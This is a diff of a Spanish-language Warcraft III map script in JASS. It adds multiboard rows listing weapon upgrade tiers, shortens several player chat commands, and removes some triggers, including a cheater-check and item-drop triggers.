+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+14),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+15),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+16),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+17),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+18),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+19),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+20),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+21),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+22),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+23),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+24),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+25),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+26),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+27),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+28),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+29),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+30),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+31),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+32),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+33),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+34),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+35),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+36),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+37),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+38),40.)
 call ConditionalTriggerExecute(ER)
 call MultiboardMinimize(Gx,true)
 call MultiboardMinimize(Gx,false)
@@ -12806,6 +13927,93 @@ call MultiboardSetItemValueBJ(Gx,1,hx,"Kills: Creeps Asesinados, BK: Boss Asesin
 call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
 set hx=(hx+1)
 call MultiboardSetItemValueBJ(Gx,1,hx,"MC: Misiones completas, HD: Muertes de héroe, SP: Puntos de Héroe, RB: Rebirths")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,0,hx,"------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Weapons Update")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',10,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,0,hx,"------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma lvl 1")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 10-99(Gema lvl 10-99)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99 1..+5 (Item +1..+5)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99S +5 (Gema Super)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99H +3 (Gema Hyper)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99H +4..+5 (Item +4..+5)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99H R(1) +1 (Gema Rebuild(1))")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99H R(1) +2..+5 (Item +2..+5)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99H R(5) +5 (Gema Rebuild(5))")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99H R(10) +5 (Gema Rebuild(10))")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Lvl 99H R(10) +6..+10 (Item +6..+10)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Golden R(10) +10 (Gema Golden)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Golden R(10) +11..+15 (Item +11..+15)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Golden R(50) +15 (Gema Rebuild(50))")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Golden R(50) +16..+25 (Item +16..+25)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma PURE +25 (Gema Pure)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Delux +25 Basica (Gema Deluxe) - Zeus Dark")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Deluxe +25:Media:Grande:Elite:Golden:Super(Fragmento de dios:Media:Grande:Elite:Golden:Super) - Titan(Oceano)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Premium +25 Basica (Gema Premium) - Titan(Cronos)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Premium +25 Grande:Elite:Golden:Super(Fragmento de dios:Grande:Elite:Golden:Super)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Premium +25 Deluxe (Gema Deluxe Mejorada) - Titan(Oceano)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Dark +25 (Gema Dark)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Dark +26..+40(Item +26..+40)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Golden Gods Arma (Golden Gods gema)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Titan +50 (Item +50)")
+call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
+set hx=(hx+1)
+call MultiboardSetItemValueBJ(Gx,1,hx,"Arma Golden Titan (Gema Golden Titan)-")
 call MultiboardSetItemColorBJ(Gx,0,hx,'d',80,.0,0)
 endfunction
 function RS takes nothing returns nothing
@@ -12981,6 +14189,7 @@ local integer pA
 local integer PA
 local version v
 local integer HA
+call ilovejason()
 call SetCameraBounds(-17792.+GetCameraMargin(CAMERA_MARGIN_LEFT),-14208.+GetCameraMargin(CAMERA_MARGIN_BOTTOM),17792.-GetCameraMargin(CAMERA_MARGIN_RIGHT),21632.-GetCameraMargin(CAMERA_MARGIN_TOP),-17792.+GetCameraMargin(CAMERA_MARGIN_LEFT),21632.-GetCameraMargin(CAMERA_MARGIN_TOP),17792.-GetCameraMargin(CAMERA_MARGIN_RIGHT),-14208.+GetCameraMargin(CAMERA_MARGIN_BOTTOM))
 call SetDayNightModels("Environment\\DNC\\DNCLordaeron\\DNCLordaeronTerrain\\DNCLordaeronTerrain.mdl","Environment\\DNC\\DNCLordaeron\\DNCLordaeronUnit\\DNCLordaeronUnit.mdl")
 call SetTerrainFogEx(0,3000.,5000.,.5,.0,.0,.0)
@@ -12993,7 +14202,6 @@ set lx=Rect(-1056.,-928.,736.,896.)
 set thantosdropregion = Rect( -832.0, 16096.0, -224.0, 17216.0 )
 set hecatedropregion = Rect( 2496.0, 15744.0, 3616.0, 16640.0 )
 set ladondropregion = Rect( 6208.0, -9856.0, 6784.0, -9120.0 )
-set herculesdropregion = Rect ( -13632.0, 5344.0, -12096.0, 6560.0) 
 set Lx=Rect(-960.,512.,-768.,736.)
 set mx=Rect(2080.,-1984.,2240.,-1824.)
 set Mx=Rect(2976.,-6720.,3168.,-6496.)
@@ -13447,25 +14655,6 @@ set Nx=CreateGroup()
 set Hx=CreateForce()
 set Ba=CreateTrigger()
 call TriggerAddAction(Ba,function iN)
-    set gg_trg_checkcheater = CreateTrigger(  )
-    call TriggerRegisterTimerEventPeriodic( gg_trg_checkcheater, 1.00 )
-    call TriggerAddAction( gg_trg_checkcheater, function Trig_checkcheater_Actions )
-    set gg_trg_esuna = CreateTrigger(  )
-    call TriggerRegisterTimerEventPeriodic( gg_trg_esuna, 0.10 )
-    call TriggerAddAction( gg_trg_esuna, function Trig_esuna_Actions )
-    set gg_trg_regenh = CreateTrigger(  )
-    call TriggerRegisterTimerEventPeriodic( gg_trg_regenh, 1.00 )
-    call TriggerAddAction( gg_trg_regenh, function Trig_regenh_Actions )
-    set gg_trg_hercai = CreateTrigger(  )
-    call TriggerRegisterTimerEventPeriodic( gg_trg_hercai, 180.00 )
-    call TriggerAddAction( gg_trg_hercai, function Trig_hercai_Actions )
-    set gg_trg_set = CreateTrigger(  )
-    call TriggerRegisterPlayerChatEvent( gg_trg_set, Player(0), "", false )
-    call TriggerAddCondition( gg_trg_set, Condition( function Trig_set_Conditions ) )
-    call TriggerAddAction( gg_trg_set, function Trig_set_Actions )
-    set gg_trg_regen = CreateTrigger(  )
-    call TriggerRegisterTimerEventPeriodic( gg_trg_regen, 3.00 )
-    call TriggerAddAction( gg_trg_regen, function Trig_regen_Actions )
     set gg_trg_alcielo = CreateTrigger(  )
     call TriggerRegisterAnyUnitEventBJ( gg_trg_alcielo, EVENT_PLAYER_UNIT_SPELL_CAST )
     call TriggerAddCondition( gg_trg_alcielo, Condition( function Trig_alcielo_Conditions ) )
@@ -13624,15 +14813,15 @@ call TriggerRegisterEnterRectSimple(pa,rr)
 call TriggerAddCondition(pa,Condition(function vb))
 call TriggerAddAction(pa,function eb)
 set Pa=CreateTrigger()
-call TriggerRegisterPlayerChatEvent(Pa,Player(0),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(1),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(2),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(3),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(4),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(5),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(6),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(7),"-Finalizar Demo",true)
-call TriggerRegisterPlayerChatEvent(Pa,Player(8),"-Finalizar Demo",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(0),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(1),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(2),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(3),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(4),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(5),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(6),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(7),"-fd",true)
+call TriggerRegisterPlayerChatEvent(Pa,Player(8),"-fd",true)
 call TriggerAddCondition(Pa,Condition(function ob))
 call TriggerAddAction(Pa,function rb)
 set qa=CreateTrigger()
@@ -13966,10 +15155,6 @@ set Armor19=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(Armor19,EVENT_PLAYER_UNIT_PICKUP_ITEM)
 call TriggerAddCondition(Armor19,Condition(function Armor19Condition))
 call TriggerAddAction(Armor19,function Armor19Action)
-set Armor20=CreateTrigger()
-call TriggerRegisterAnyUnitEventBJ(Armor20,EVENT_PLAYER_UNIT_PICKUP_ITEM)
-call TriggerAddCondition(Armor20,Condition(function Armor20Condition))
-call TriggerAddAction(Armor20,function Armor20Action)
 set lifeSteal=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(lifeSteal,EVENT_PLAYER_UNIT_ATTACKED)
 call TriggerAddCondition(lifeSteal,Condition(function lifeStealCondition))
@@ -14676,10 +15861,6 @@ set ladondrop=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(ladondrop,EVENT_PLAYER_UNIT_DEATH)
 call TriggerAddCondition(ladondrop,Condition(function ladondropCondition))
 call TriggerAddAction(ladondrop,function ladondropAction)
-set herculesdrop=CreateTrigger()
-call TriggerRegisterAnyUnitEventBJ(herculesdrop,EVENT_PLAYER_UNIT_DEATH)
-call TriggerAddCondition(herculesdrop,Condition(function herculesdropCondition))
-call TriggerAddAction(herculesdrop,function herculesdropAction)
 set hecatedrop=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(hecatedrop,EVENT_PLAYER_UNIT_DEATH)
 call TriggerAddCondition(hecatedrop,Condition(function hecatedropCondition))
@@ -14693,15 +15874,15 @@ call TriggerRegisterAnyUnitEventBJ(IO,EVENT_PLAYER_UNIT_DEATH)
 call TriggerAddCondition(IO,Condition(function Dp))
 call TriggerAddAction(IO,function Kp)
 set AO=CreateTrigger()
-call TriggerRegisterPlayerChatEvent(AO,Player(0),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(1),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(2),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(3),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(4),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(5),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(6),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(7),"-done",true)
-call TriggerRegisterPlayerChatEvent(AO,Player(8),"-done",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(0),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(1),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(2),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(3),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(4),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(5),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(6),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(7),"-d",true)
+call TriggerRegisterPlayerChatEvent(AO,Player(8),"-d",true)
 call TriggerAddCondition(AO,Condition(function Lp))
 call TriggerAddAction(AO,function Mp)
 set NO=CreateTrigger()
@@ -14843,26 +16024,26 @@ call TriggerRegisterAnyUnitEventBJ(uO,EVENT_PLAYER_UNIT_ATTACKED)
 call TriggerAddCondition(uO,Condition(function os))
 call TriggerAddAction(uO,function rs)
 set UO=CreateTrigger()
-call TriggerRegisterPlayerChatEvent(UO,Player(0),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(1),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(2),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(3),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(4),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(5),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(6),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(7),"-Killme",true)
-call TriggerRegisterPlayerChatEvent(UO,Player(8),"-Killme",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(0),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(1),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(2),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(3),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(4),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(5),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(6),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(7),"-k",true)
+call TriggerRegisterPlayerChatEvent(UO,Player(8),"-k",true)
 call TriggerAddAction(UO,function as)
 set wO=CreateTrigger()
-call TriggerRegisterPlayerChatEvent(wO,Player(0),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(1),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(2),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(3),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(4),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(5),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(6),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(7),"-Delete Armor",true)
-call TriggerRegisterPlayerChatEvent(wO,Player(8),"-Delete Armor",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(0),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(1),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(2),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(3),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(4),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(5),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(6),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(7),"-del",true)
+call TriggerRegisterPlayerChatEvent(wO,Player(8),"-del",true)
 call TriggerAddAction(wO,function Es)
 set WO=CreateTrigger()
 call TriggerRegisterPlayerChatEvent(WO,Player(0),"-Autoclear",false)
@@ -14903,10 +16084,6 @@ call TriggerRegisterPlayerChatEvent(eR,Player(8),"-saveold",true)
 call TriggerRegisterPlayerChatEvent(eR,Player(9),"-saveold",true)
 call TriggerRegisterPlayerChatEvent(eR,Player($A),"-saveold",true)
 call TriggerAddAction(eR,function ps)
-    set gg_trg_givejob = CreateTrigger(  )
-    call TriggerRegisterPlayerChatEvent( gg_trg_givejob, Player(0), "-givejob", true )
-    call TriggerAddCondition( gg_trg_givejob, Condition( function Trig_givejob_Conditions ) )
-    call TriggerAddAction( gg_trg_givejob, function Trig_givejob_Actions )
 set xR=CreateTrigger()
 call TriggerRegisterPlayerChatEvent(xR,Player(0),"-loadold ",false)
 call TriggerRegisterPlayerChatEvent(xR,Player(1),"-loadold ",false)
